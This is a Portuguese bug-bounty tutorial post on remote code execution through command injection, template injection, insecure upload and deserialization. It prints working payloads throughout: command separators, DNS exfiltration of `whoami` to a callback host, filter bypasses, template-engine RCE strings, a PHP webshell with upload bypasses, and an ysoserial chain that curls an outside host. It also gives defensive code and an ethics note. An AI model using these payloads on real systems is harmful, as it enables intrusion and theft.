---
title: "RCE: Command Injection, SSTI e Upload que viram shell"
description: "Os caminhos que levam à Remote Code Execution — injeção de comando no SO, Server-Side Template Injection, upload inseguro e desserialização — com detecção, exploração e defesa em camadas."
author: matheus
date: 2026-06-03 23:50:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["RCE", "command injection", "SSTI", "file upload", "insecure deserialization", "OWASP", "bug bounty", "web security", "Burp Suite"]
pin: false
comments: true
---
Os caminhos que levam à Remote Code Execution — injeção de comando no SO, Server-Side Template Injection, upload inseguro e desserialização — com detecção, exploração e defesa em camadas.

{% raw %}

## O bug que vale o programa inteiro

Existe um momento que todo caçador de bug sonha: você manda `;id` num campo qualquer e a resposta volta com `uid=33(www-data)`. Não é mais "consigo ler a fatura de outro cliente". Agora é **"o servidor roda o comando que eu mandar"**. Isso é **RCE — Remote Code Execution**, o topo da cadeia alimentar das vulnerabilidades web.

RCE é a falha que faz o programa parar tudo pra te ouvir. Enquanto um IDOR expõe **dados** (já vimos isso no post [10 — Broken Access Control](/posts/broken-access-control-idor-bola-bfla/)), um RCE entrega o **host**: ler arquivos, pivotar pra rede interna (usar a máquina invadida como trampolim pra alcançar outras), virar root. Por isso é também a que mais paga — de **alguns milhares** num caso autenticado e contido até **valores de cinco dígitos** quando é não-autenticado e crítico.

A boa notícia pra quem está começando: a maioria dos RCE em bug bounty **não** é exploit de memória cabeludo. São quatro caminhos repetidos à exaustão, e todos têm a mesma raiz — **input do usuário chegando num lugar que executa coisas**. Neste post a gente cobre os quatro: **OS Command Injection**, **SSTI**, **Upload inseguro → webshell** e, de leve, **desserialização**. Do `{{7*7}}` ao shell.

## O que é RCE (e a raiz comum dos quatro caminhos)

**RCE** é fazer o servidor **executar código ou comandos que você controla**. O "remote" é literal: você está do outro lado da internet e mesmo assim o processo da aplicação roda o que você mandou.

> **Analogia:** imagine um caixa de banco que segue ordens escritas num formulário. O sistema seguro lê o formulário como **dados** ("depositar R$100 na conta 1001"). O sistema vulnerável trata cada linha como **comando a executar** — então se você escrever no campo "valor" a frase *"…e também abra o cofre e me entregue tudo"*, ele obedece. A falha nunca é o atacante ser esperto; é o sistema **não separar dado de instrução**.

Essa é a raiz dos quatro caminhos. Em cada um, um dado seu cruza uma fronteira onde devia continuar sendo dado e vira instrução:

| Caminho | Onde o dado vira instrução | Resultado |
|---|---|---|
| **OS Command Injection** | input concatenado num **comando de shell** (`system()`, `exec()`) | comandos no SO |
| **SSTI** | input concatenado num **template** que é avaliado | código na linguagem da app (Python/PHP/Java) → SO |
| **Upload inseguro** | arquivo seu salvo num diretório **executável** pelo servidor | webshell → comandos no SO |
| **Desserialização** | bytes seus reconstruídos em **objetos** que disparam código | gadget chain → comandos no SO |

Guarde isso: o resto do post é só detalhar **como** cruzar cada fronteira — e como o defensor fecha cada uma.

## Por que importa (e quanto paga)

O impacto de RCE é o mais fácil de vender pro programa porque ele engloba quase todos os outros:

- **Comprometimento total do host**: ler/escrever qualquer arquivo (`/etc/passwd`, configs com senha, chaves privadas), criar usuários, instalar backdoor.
- **Pivot pra rede interna**: do servidor exposto você alcança bancos de dados, serviços internos, metadata da cloud — vira a porta de entrada pra tudo. (O caminho inverso também existe: um SSRF que chega num Redis interno via `gopher://` vira RCE — veja [16 — SSRF](/posts/ssrf/).)
- **Vazamento em massa**: com shell, dump do banco inteiro é trivial.

Em programas reais, RCE costuma sentar na faixa **Crítica**. Casos contidos (autenticado, baixo privilégio, ambiente de HML) ainda pagam de **R$1.000 a R$3.000**; um RCE não-autenticado em produção entra em **dezenas de milhares**. O que move o ponteiro é **privilégio** (rodou como `www-data` ou como `root`?) e **autenticação** (precisava estar logado?).

> ⚠️ **Cuidado redobrado na PoC** (Proof of Concept — a prova mínima de que o bug existe; detalhe no [Glossário](/posts/fundamentos-web-hacking/))**.** RCE é a classe onde é mais fácil **passar do ponto** e causar dano real. A regra é provar o mínimo: `id`, `whoami`, `hostname`, ou um *callback* OOB. **Nunca** `cat` em dado de cliente, nunca apague nada, nunca abra reverse shell (conexão em que o servidor invadido "liga de volta" pra você, te dando um terminal nele) sem autorização explícita. Falamos disso na nota ética no fim.

## Como funciona por trás

Vamos ao mecanismo de cada caminho, com o código vulnerável real do backend — porque entender *o porquê* é o que te deixa replicar em qualquer linguagem.

### Command Injection — a concatenação fatal

O servidor monta uma linha de comando juntando seu input via **shell**:

```php
// Backend VULNERÁVEL (PHP) — ferramenta de "ping" num painel
$host = $_GET['host'];
system("ping -c 1 " . $host);   // <- seu input entra cru na linha de comando
```

Se você manda `host=8.8.8.8`, roda `ping -c 1 8.8.8.8`. Mas o shell interpreta **metacaracteres**. Se você manda `host=8.8.8.8; id`, o shell vê **dois comandos** separados por `;` e roda os dois:

```
ping -c 1 8.8.8.8; id
```

O `;` é o ponto onde dado virou instrução. O shell não tem como saber que `id` "não devia estar ali" — pra ele é só mais um comando.

### SSTI — quando o input entra no template

Template engine é o que monta HTML com dados dinâmicos (Jinja2 no Python/Flask, Twig no PHP/Symfony, Freemarker no Java). O fluxo seguro passa o dado como **variável**:

```python
# SEGURO — username é um VALOR passado ao template
render_template("hello.html", username=request.args.get("name"))
```

O fluxo vulnerável **concatena** o input dentro do **texto do template** e só então renderiza:

```python
# VULNERÁVEL (Flask/Jinja2) — input vira PARTE do template
from jinja2 import Template
nome = request.args.get("name")
Template("Olá " + nome).render()   # <- o template é construído com input do usuário
```

Agora `name={{7*7}}` não é texto: o Jinja2 **avalia** `7*7` e devolve `Olá 49`. Você está executando expressões na linguagem do template — e de expressão a `os.popen('id')` é um pulo.

### Upload — o arquivo no lugar errado

```php
// VULNERÁVEL — salva com o nome original, sem validar o conteúdo
move_uploaded_file($_FILES['avatar']['tmp_name'], "uploads/" . $_FILES['avatar']['name']);
```

Se `uploads/` é servido pelo Apache/PHP **e** você consegue salvar um `shell.php` lá, ao acessar `https://alvo.com/uploads/shell.php` o servidor **executa** o PHP. O arquivo deixou de ser "dado armazenado" e virou "código executável".

### Desserialização — bytes que viram objetos

Serializar = transformar um objeto em bytes pra guardar/transmitir; desserializar = reconstruir. O problema: reconstruir um objeto pode **disparar métodos** (construtores, `__wakeup` no PHP, `readObject` no Java). Se o atacante controla os bytes, ele monta uma cadeia de objetos (*gadget chain*) cuja reconstrução acaba chamando algo como `Runtime.exec()`.

## Tipos e variações

Antes de explorar, o mapa do território:

**OS Command Injection**
1. **In-band (com retorno)** — a saída do comando volta na resposta HTTP. O sonho.
2. **Blind** — o comando roda mas a saída não aparece. Confirma por **tempo** (`sleep`/`ping`) ou **OOB** (DNS/HTTP pra um host seu).
3. **Argument injection** — você não injeta comando novo, mas injeta **flags** num binário (ex.: `-o` numa chamada de `curl`).

**SSTI** — varia por **engine**: Jinja2 (Python), Twig (PHP), Freemarker/Velocity (Java), ERB (Ruby), Mako, Smarty etc. Cada uma tem sintaxe e payload de escalada diferentes.

**Upload → RCE** — por **bypass de validação**: extensão, `Content-Type`/MIME, *magic bytes*, ou **path** (onde o arquivo cai). Combinações são comuns.

**Desserialização** — Java (`ObjectInputStream`, ysoserial), PHP (`unserialize()`, POP chains), .NET, Python (`pickle`), Node (`node-serialize`).

## Recon — como encontrar superfície de RCE

RCE mora em **funções que tocam o sistema**. Onde olhar:

- **Command Injection**: qualquer feature que cheira a comando externo — *ping/traceroute/nslookup* em painéis de rede, conversão de imagem/PDF (ImageMagick, Ghostscript), geração de QR/thumbnail, "exportar relatório", webhooks, campos que viram nome de arquivo.
- **SSTI**: qualquer lugar onde **seu texto reaparece renderizado** — campos de busca, nome de perfil, **e-mails gerados por template** (reset de senha, convites, notas), assunto/corpo de notificação, "preview" de conteúdo. (Lembra que entrada refletida também é território de XSS, post [00 — Fundamentos](/posts/fundamentos-web-hacking/)? SSTI é o primo do lado servidor.)
- **Upload**: avatar, anexo de ticket, importação de planilha, foto de documento, qualquer `multipart/form-data` com arquivo.
- **Desserialização**: cookies/tokens que parecem base64 de objeto (Java começa com `rO0` em base64, `AC ED 00 05` em hex), parâmetros `ViewState`, campos `__VIEWSTATE`, payloads que viajam serializados.

Ferramentas pra mapear (apresentadas no post [01 — Recon](/posts/recon-discovery/)):

```bash
# Endpoints/parâmetros escondidos vivem nos arquivos JS — leia CADA um
echo https://alvo.com | gau | grep '\.js$' | httpx -mc 200 -content-type | grep javascript
```

```text
# Dorks pra achar painéis e ferramentas administrativas (alta chance de command injection)
site:alvo.com inurl:ping | inurl:exec | inurl:cmd | inurl:tool | inurl:diag
```

> 💡 **Sinal de ouro pra SSTI:** se um campo te xinga com **erro 500 / stack trace** quando você manda `{{`, `${` ou `%}`, acendeu a luz. Quebrar o parser é meio caminho — a engine está processando seu input como template.

## Exploração passo a passo

### Parte A — OS Command Injection

**Nível 1 — Separadores (detecção in-band).** O shell aceita vários metacaracteres pra encadear comandos. Os que funcionam em **Linux e Windows** são `&`, `&&`, `|`, `||`; os **só-Unix** são `;`, a quebra de linha (`\n` / `0x0a`), as crases `` `comando` `` e o `$(comando)`. Teste cada um a partir de um valor que já funciona:

```http
POST /api/tools/ping HTTP/2
Host: alvo.com
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1;id          # ; encadeia (Unix)
host=127.0.0.1|id          # pipe: saída do 1º vira entrada do 2º
host=127.0.0.1&&id         # só roda o 2º se o 1º der certo
host=127.0.0.1`id`         # crase: substitui pela saída de id
host=127.0.0.1$(id)        # idem, sintaxe moderna
```

Se a resposta trouxer `uid=…`, é in-band e você confirmou. Esses são os separadores exatos que a [PortSwigger documenta](https://portswigger.net/web-security/os-command-injection).

**Nível 2 — Blind por tempo.** A saída não volta? Faça o servidor **demorar de propósito**. Se a resposta que era instantânea passa a levar ~10s, o comando rodou:

```http
host=127.0.0.1 & ping -c 10 127.0.0.1 &     # Linux: 10 pings ≈ 10s
host=127.0.0.1 & sleep 10 &                 # mais direto
```

O `ping -c 10 127.0.0.1` é o exemplo da própria PortSwigger pra blind — `-c 10` manda 10 pacotes, ~1s cada.

**Nível 3 — Blind por OOB (a técnica que nunca falha).** Tempo é frágil (rede oscila). O método robusto é **out-of-band**: faça o servidor te mandar uma requisição DNS/HTTP pra um host que você controla. Use o **Burp Collaborator** (ou `interactsh`) — ele te dá um subdomínio único e mostra qualquer interação que chegar:

```http
host=127.0.0.1 & nslookup ABCDE.seu-id.oast.fun &
```

Se aparecer um *hit* DNS de `ABCDE.seu-id.oast.fun` no Collaborator, o comando executou — **mesmo sem nada voltar na resposta HTTP**. Dá até pra **exfiltrar** a saída pelo subdomínio:

```http
host=127.0.0.1 & nslookup `whoami`.seu-id.oast.fun &
```

A consulta DNS vira algo como `www-data.seu-id.oast.fun` — a saída de `whoami` viajou no nome do host. Padrão idêntico ao da PortSwigger (lá com `nslookup kgji2ohoyw.web-attacker.com`).

**Nível 4 — Bypass de filtros.** Bloquearam espaço, `;` ou `cat`? O shell tem mil sinônimos:

| Filtro | Bypass | Por quê |
|---|---|---|
| espaço bloqueado | `${IFS}` | variável de campo de separação do shell = espaço |
| espaço bloqueado | `{cat,/etc/passwd}` | *brace expansion* separa por vírgula |
| `/` bloqueado | `${PATH:0:1}` | extrai o `/` da variável PATH |
| palavra `cat` na blacklist | `c\at`, `c""at`, `ca''t` | shell ignora `\`/aspas vazias na hora de resolver o binário |
| comando como string | `$(printf "\151\144")` | `id` em octal |

> Repare no padrão `$(curl${IFS}oast.me)` (curl + `${IFS}` no lugar do espaço): é exatamente assim que se contorna filtro de espaço numa injeção de comando — vamos ver esse formato num CVE real mais adiante.

### Parte B — SSTI

**Passo 1 — Detectar.** Comece com o polyglot que quebra parser de várias engines de uma vez (recomendado pela PortSwigger): mande `${{<%[%'"}}%\` num campo refletido. Se der erro de template, há SSTI. Então confirme com a multiplicação:

```
{{7*7}}    -> se renderizar 49, é uma engine de chaves duplas (Jinja2, Twig)
${7*7}     -> se renderizar 49, é de cifrão (Freemarker, Velocity, e a maioria das Java)
```

O detalhe **crucial**: `{{7*7}}` precisa virar **49**, não `7*7` (texto bruto, sem SSTI) e nem `14` (isso seria `7+7` — não confunda). 49 = a multiplicação **foi avaliada no servidor**.

**Passo 2 — Identificar a engine.** Sabendo se é `{{ }}` ou `${ }`, refine com testes que só uma engine entende:

| Teste | Renderiza | Engine provável |
|---|---|---|
| `{{7*7}}` → `49` **e** `{{7*'7'}}` → `7777777` | string repetida 7× | **Jinja2** (Python) — repete a string `'7'` sete vezes |
| `{{7*7}}` → `49` **e** `{{7*'7'}}` → `49` | número | **Twig** (PHP) — converte `'7'` em número (type juggling) e multiplica |
| `${7*7}` → `49` | número | **Freemarker / Velocity** (Java) |
| `<%= 7*7 %>` → `49` | número | **ERB** (Ruby) |

> O par `{{7*'7'}}` é o desempate clássico da PortSwigger: **`7777777` = Jinja2**, **`49` = Twig**. As duas usam `{{ }}`, então a multiplicação simples não distingue — a multiplicação por **string** sim.

**Passo 3 — Escalar pra RCE.** Aqui o caçador iniciante trava e o sênior brilha. A ideia geral é a mesma em toda engine: **a partir de um objeto acessível, navegar até um objeto que executa comandos**. Payloads verificados (PayloadsAllTheThings / PortSwigger):

**Jinja2 (Python)** — o caminho clássico via `os.popen`:

```python
# Acessa o módulo os por um objeto built-in e roda o comando
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Variante histórica: sobe na árvore de classes e acha um subclass útil
{{ ''.__class__.__mro__[1].__subclasses__() }}   # lista subclasses; ache Popen pelo índice
```

`cycler.__init__.__globals__` te dá o namespace global do módulo onde `cycler` vive — e lá mora `os`. De `os.popen('id').read()` sai a saída do comando.

**Twig (PHP)** — registra `system` como callback de filtro:

```twig
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{ ['id'] | map('system') | join }}     # alternativa via filtro map (Twig moderno); |join concatena a saída
```

**Freemarker (Java)** — a classe utilitária `Execute`:

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**Velocity (Java)** — chega no `Runtime` por reflexão:

```
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
```

**Ferramenta:** [`tplmap`](https://github.com/epinna/tplmap) automatiza detecção e exploração em 15+ engines (Jinja2, Twig, Freemarker, Velocity, Mako, ERB…). Uso básico `./tplmap.py -u 'http://alvo.com/page?name=John'`; com `--os-shell` ele te dá um pseudo-shell interativo. Ótimo pra confirmar rápido — mas **entenda o payload manual antes**, porque scanner erra engine e gera falso negativo.

### Parte C — Upload inseguro → webshell

A meta: subir um arquivo que o servidor **execute**. O webshell PHP mínimo (PayloadsAllTheThings):

```php
<?php system($_GET['cmd']); ?>
```

Acessou `shell.php?cmd=id` → roda `id`. As barreiras que você vai encontrar e como passar:

**1. Filtro de extensão.** Se bloqueiam `.php`, tente as variações que o PHP ainda executa, ou disfarce:

```
shell.phtml   shell.php5   shell.php7   shell.pht   shell.phar
shell.jpg.php          # dupla extensão (filtro só olha o começo)
shell.php.jpg          # dupla reversa (se o servidor casa .php no meio)
shell.pHp              # variação de caixa
shell.php%00.jpg       # null byte (em stacks antigas, corta no %00)
shell.php......        # trailing dots (Windows remove os pontos)
```

> 💡 **Truque do `.htaccess` (Apache):** se a app aceita `.htaccess` no diretório de upload, você não precisa burlar a lista de extensões — você **muda as regras**. Suba um `.htaccess` com `AddType application/x-httpd-php .rce` e, a partir daí, qualquer `shell.rce` que você enviar é executado como PHP. Confirmado no [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files).

**2. Filtro de `Content-Type` (MIME).** A validação confia no header do `multipart`. Você mente:

```http
POST /upload HTTP/2
Host: alvo.com
Content-Type: multipart/form-data; boundary=---X

-----X
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/gif        # <- mente: digo que é imagem

<?php system($_GET['cmd']); ?>
-----X--
```

**3. Validação por *magic bytes*.** O servidor lê os primeiros bytes pra confirmar que é imagem. Você prefixa a **assinatura** real e o PHP roda o resto (PHP ignora o lixo antes do `<?php`):

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

`GIF89a;` é a assinatura de um GIF — passa na checagem de "é imagem?" sem deixar de ser PHP válido. Outras: JPG = `\xFF\xD8\xFF`, PNG = `\x89PNG\r\n\x1a\n`.

**4. Onde o arquivo cai (path).** Subiu mas não executa? Talvez o diretório de upload não rode PHP (config `php_admin_flag engine off`), ou o nome foi randomizado. Procure o **caminho real** na resposta (muitos endpoints devolvem a URL do arquivo) e teste *path traversal* no `filename` (`../../`) pra sair da pasta isolada.

### Parte D — Desserialização (panorama)

Detecção: identifique o **formato serializado** (Java base64 começa com `rO0`; PHP `unserialize` recebe algo tipo `O:4:"User":…`; .NET `ViewState`). Exploração em Java usa o [`ysoserial`](https://github.com/frohoff/ysoserial), que gera *gadget chains* prontas:

```bash
java -jar ysoserial.jar CommonsCollections5 'curl seu-id.oast.fun' | base64
```

Você joga o blob no parâmetro/cookie serializado e, se houver gadget compatível no classpath, a reconstrução dispara o comando. É um tema denso — aqui fica o mapa; o detalhe (gadget chains por linguagem, `__wakeup`/`readObject`, ysoserial passo a passo) tem post próprio: [29 — Insecure Deserialization](/posts/insecure-deserialization/).

## Caso real-fictício: Git exposto → webshell → RCE

> Cenário **fictício, baseado em padrões reais** de bug bounty (anonimizado).

Você testa `app.exemplo.com`, ambiente de homologação. No recon, percebe que o diretório `.git/` está acessível (clássico de **misconfiguration**, post [11](/posts/security-misconfiguration-cve-hunting/)).

**Passo 1 — Dump do repositório.** Com [`git-dumper`](https://github.com/arthaud/git-dumper) você reconstrói o código-fonte a partir do `.git/` exposto:

```bash
git-dumper https://app.exemplo.com outGit
```

**Passo 2 — Achar a joia.** Lendo o código baixado, aparece um arquivo de debug que ficou esquecido em produção:

```php
// outGit/__comandos.php  — deixado por engano
<?php system($_GET['cmd'], $retorno); echo $retorno; ?>
```

É uma **webshell que o próprio dev escreveu** — `system($_GET['cmd'])` sem nenhum filtro. Command injection servido de bandeja.

**Passo 3 — Confirmar RCE (com cuidado).** No navegador/Repeater, comandos inofensivos só pra provar:

```http
GET /__comandos.php?cmd=id HTTP/2
Host: app.exemplo.com
```

```http
HTTP/2 200 OK
Content-Type: text/html

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uid=33(www-data)` = você executa comandos como o usuário do servidor web. RCE confirmado. Pra documentar o alcance sem causar dano, `cmd=hostname` e `cmd=id` bastam — **não** despeje dado de cliente.

**O que a tela do Burp mostraria:** painel Request/Response; na Request o `cmd=id` destacado; na Response o `uid=33(www-data)` em texto puro, provando execução.

**Passo 4 — Report.** Título `[RCE] - Execução remota de comandos via webshell exposta por .git/ público`. Resumo no risco ao negócio: *"qualquer usuário não-autenticado executa comandos arbitrários no servidor (uid www-data), com potencial de comprometimento total do host e pivot pra rede interna"*. Passos numerados + prints de `id`/`hostname`. Severidade **Crítica**. (Modelo de report no post [03 — Como escrever um report que paga](/posts/como-escrever-report-que-paga/).)

## CVEs reais como ilustração (a técnica, não a cópia)

Dois casos públicos mostram os mesmos mecanismos deste post na prática:

> 💡 **CWE / CVSS**: o **CWE** é o "tipo" da falha (ex.: CWE-78 = OS Command Injection); o **CVSS** é a nota de gravidade de 0 a 10 (v3.1 e v4.0 convivem hoje). Como montar o vetor e argumentar a severidade com o triador: [02 — Severidade, impacto e triagem](/posts/severidade-impacto-triagem/). Definição rápida no [Glossário](/posts/fundamentos-web-hacking/).

- **Command Injection via SMTP — CVE-2024-45519 (Zimbra).** O serviço `postjournal` do Zimbra Collaboration passava conteúdo de e-mail pra um comando do SO sem sanitizar. Um atacante **não-autenticado** mandava um e-mail cujo endereço no `RCPT TO` carregava `$(comando)`, contornando o filtro de espaço com `${IFS}` (ex.: `RCPT TO: <"aaa$(curl${IFS}seu-host)"@dominio.com>`). Classificado **CWE-78 (OS Command Injection)**, CVSS v3.1 **9.8** (vetor `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`; o CNA pontuou 10.0 com escopo alterado). É o caminho "input → shell" da Parte A, só que a fronteira foi o protocolo de e-mail em vez de um campo HTTP. ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-45519))

- **Injeção de expressão num gateway — CVE-2022-22947 (Spring Cloud Gateway).** Quando o endpoint **Actuator** do gateway ficava exposto e sem auth, dava pra criar uma rota com um filtro contendo **SpEL** (Spring Expression Language). A expressão usava reflexão pra chegar em `T(java.lang.Runtime).getRuntime().exec(...)` — primo do payload de Velocity da Parte B. Após um *refresh* da config, acessar a rota disparava o comando com os privilégios do processo do gateway (em muitos containers, **root**). **CWE-917 (Expression Language Injection)**, CVSS v3.1 **10.0** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`). ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-22947))

> 💡 **Sobre o CVSS v4.0:** o NVD ainda **não publicou** vetor v4.0 pra esses dois CVEs (na data deste post). Pra calibrar a cabeça: um RCE típico não-autenticado, mas **sem comprometer outro sistema além do alvo** (subsequente `SC:N/SI:N/SA:N`), dá **9.3 (Crítico)** no v4.0 — vetor `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`. Ou seja, o "9.8 do v3.1" costuma virar "9.3 do v4.0". Quando o RCE serve de pivô e derruba sistemas vizinhos, o subsequente sobe e o v4.0 chega a 10.0. Sempre confirme no [calculador oficial do FIRST](https://www.first.org/cvss/calculator/4.0).

A lição: o *mecanismo* (dado virando instrução) é sempre o mesmo. Mude a fronteira — SMTP, template, expressão, arquivo — e você reconhece a falha.

## Defesa em camadas

RCE se mata na **arquitetura**, não com um regex. Camada por camada:

**1. A regra de ouro — nunca passe input pra shell/eval.** Use APIs que recebem o comando como **lista de argumentos** (sem shell no meio):

```php
// ERRADO — string montada e entregue ao shell
system("ping -c 1 " . $_GET['host']);

// CERTO — sem shell; argumentos isolados, host validado por allowlist
$host = $_GET['host'];
if (!filter_var($host, FILTER_VALIDATE_IP)) { http_response_code(400); exit; }
$out = [];
exec('ping -c 1 ' . escapeshellarg($host), $out);   // escapeshellarg neutraliza metacaracteres
```

```python
# Python — NUNCA shell=True com input; passe lista de args
import subprocess, ipaddress
host = request.args["host"]
ipaddress.ip_address(host)                  # valida ou lança exceção
subprocess.run(["ping", "-c", "1", host])   # sem shell: ; | $() são literais, não comandos
```

```javascript
// Node — execFile (sem shell), não exec/child_process com string concatenada
const { execFile } = require("child_process");
execFile("ping", ["-c", "1", host]);   // host é argumento, nunca interpretado pelo shell
```

**2. SSTI — não construa template com input; sandbox + autoescape.**

```python
# ERRADO — input vira parte do template
Template("Olá " + nome).render()

# CERTO — input é VARIÁVEL passada ao template; autoescape ligado
render_template("hello.html", nome=nome)   # Jinja2 com autoescape (padrão no Flask)
```

Se você *precisa* deixar usuário editar templates (CMS), use **engine em modo sandbox** (`SandboxedEnvironment` no Jinja2) — mas saiba que sandboxes de template têm histórico de bypass; trate como mitigação, não bala de prata.

**3. Upload — valide por conteúdo, sirva de fora do webroot, renomeie.**

```php
// Allowlist de extensão + checa MIME real + nome aleatório + fora do webroot
$ok = ['jpg' => 'image/jpeg', 'png' => 'image/png'];
$mime = mime_content_type($_FILES['f']['tmp_name']);   // lê o conteúdo, não confia no header
$ext  = array_search($mime, $ok, true);
if ($ext === false) { http_response_code(415); exit; }

$nome = bin2hex(random_bytes(16)) . '.' . $ext;        // descarta o nome do usuário
move_uploaded_file($_FILES['f']['tmp_name'], "/var/uploads/$nome");  // fora do /var/www
```

E no servidor: o diretório de uploads **não executa código** (`php_admin_flag engine off`, ou bucket S3 servindo como estático).

**4. Desserialização — não desserialize dado não-confiável.** Prefira formatos de **dados puros** (JSON com schema) em vez de serialização de objetos. Em Java, use *filtros* de desserialização (`ObjectInputFilter`) com allowlist de classes.

**5. Contenção (vale pros quatro).** Princípio do menor privilégio: o processo web roda como usuário sem permissão de escrita no código, em container/jail; *egress firewall* barra o OOB/reverse shell; WAF e monitoramento alertam em `id`, `/etc/passwd`, picos de latência.

> ❌ **O que NÃO basta:** blacklist de palavras (`cat`, `;`) — o shell tem sinônimos infinitos (vimos os bypasses); validar upload só pelo `Content-Type` (é o atacante que envia); esconder o `.git/`/endpoint no front; confiar que "ninguém vai achar o `__comandos.php`".

## Ferramentas + labs legais

- **Burp Suite** — Repeater (testar separadores/payloads), Intruder (fuzzar engines/extensões), **Collaborator** (OOB pra blind command injection/SSRF).
- **interactsh** ([ProjectDiscovery](https://github.com/projectdiscovery/interactsh)) — servidor OOB gratuito, alternativa ao Collaborator.
- **tplmap** — automatiza SSTI (detecção + RCE + `--os-shell`).
- **ysoserial** — gera gadget chains pra desserialização Java.
- **commix** ([github](https://github.com/commixproject/commix)) — automatiza detecção/exploração de command injection.
- **Labs (autorizados):** [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection) e [SSTI](https://portswigger.net/web-security/server-side-template-injection), [DVWA](https://github.com/digininja/DVWA) (Command Injection + File Upload), TryHackMe, HackTheBox, HackingClub.

## Checklist do caçador

- [ ] Mapeei features que **tocam o SO** (ping, conversão de arquivo, export) e campos **refletidos** (busca, perfil, e-mails de template).
- [ ] Testei os separadores de command injection: `;` `|` `&` `&&` `` ` `` `$()` (Unix) e `&` `&&` `|` `||` (cross-platform).
- [ ] Sem retorno na resposta? Tentei **blind por tempo** (`sleep`/`ping -c 10`) e **OOB** (DNS/HTTP via Collaborator).
- [ ] Filtro no caminho? Apliquei bypass: `${IFS}`, `{a,b}`, aspas/`\` no meio do binário.
- [ ] SSTI: rodei o polyglot `${{<%[%'"}}%\`, confirmei `{{7*7}}`/`${7*7}` = **49**, identifiquei a engine e escalei com o payload certo.
- [ ] Upload: tentei bypass de **extensão**, **MIME** e **magic bytes**; achei o **path** real e testei execução.
- [ ] Procurei dados **serializados** (`rO0`, `O:4:`, ViewState) pra desserialização.
- [ ] Provei o mínimo (`id`/`hostname`/OOB), **sem** tocar dado real, e confirmei que está **no escopo**.

## O que você precisa lembrar

- **RCE = input cruzando uma fronteira onde vira instrução.** Quatro fronteiras: shell (command injection), template (SSTI), arquivo executável (upload), objeto reconstruído (desserialização).
- A confirmação muda por caminho: **`uid=`** (command injection), **`49`** (SSTI), **execução do webshell** (upload).
- O dinheiro está no **privilégio** e na **autenticação**: não-auth + root = topo do impacto.
- A defesa real é **separar dado de instrução** (args isolados, template com variável, validar por conteúdo) + **contenção** (menor privilégio, egress firewall).

> 💡 **Dica de ouro:** quando uma feature processa algo que **vira comando, template, arquivo ou objeto**, mande primeiro um *probe* inofensivo — `;id`, `{{7*7}}`, um `.phtml` com `GIF89a`, ou um *callback* OOB. Se o servidor reagir diferente (executou, avaliou, renderizou, te ligou de volta), você está a um passo de provar RCE. **Prove com o mínimo** — `id` já vale o report.

## Nota ética

RCE é a classe mais perigosa pra explorar: um comando errado **derruba ou danifica** sistema de produção. A regra é inegociável — só alvos **autorizados** (bug bounty no escopo, pentest contratado, labs legais), e a PoC é sempre **não-destrutiva**: `id`, `whoami`, `hostname`, ou um *callback* DNS. Nunca leia/exfiltre dado de terceiros, nunca apague nada, nunca deixe webshell ou backdoor pra trás, e jamais abra reverse shell sem autorização explícita por escrito. Achou RCE? Pare, documente o mínimo e **reporte rápido** — host comprometido é risco ativo pro programa. Use pra proteger, não pra destruir.

## Referências

- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection) e [exploiting SSTI](https://portswigger.net/web-security/server-side-template-injection/exploiting)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection), [SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) e [Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection) e [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [NVD — CVE-2024-45519 (Zimbra postjournal RCE)](https://nvd.nist.gov/vuln/detail/CVE-2024-45519) · [NVD — CVE-2022-22947 (Spring Cloud Gateway)](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)
- [tplmap](https://github.com/epinna/tplmap) · [ysoserial](https://github.com/frohoff/ysoserial) · [commix](https://github.com/commixproject/commix)

---
*Anterior na série: [Account Takeover — JWT, reset de senha e OAuth](/posts/account-takeover/) · base: [Recon & Discovery](/posts/recon-discovery/) · relacionado: [Security Misconfiguration & CVE hunting](/posts/security-misconfiguration-cve-hunting/)*
{% endraw %}
